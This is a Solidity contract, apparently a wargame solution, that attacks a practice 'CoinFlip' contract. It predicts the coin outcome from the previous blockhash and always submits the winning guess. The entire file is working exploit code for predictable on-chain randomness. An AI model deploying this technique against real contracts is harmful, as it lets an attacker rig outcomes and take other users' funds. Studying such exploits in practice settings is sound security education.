// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';
import './CoinFlip.sol';

contract CoinFlipToHack {

    using SafeMath for uint256;

    CoinFlip public instanceToHack;
    uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    // get instance of CoinFlip to hack:
    function setInstance(CoinFlip _instanceAddress) public {
        instanceToHack = CoinFlip(_instanceAddress);
    }

    // hack the instance, i.e. CoinFlip
    function hackCoinFlip(bool _guess) public returns(uint256) {

        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;

        // if a guess equals to side, use guess to flip()
        if (side == _guess) {
            instanceToHack.flip(_guess);
        // if a guess does not equal to side, use the opposite guess to flip()
        } else {
            instanceToHack.flip(!_guess);
        }
    }

}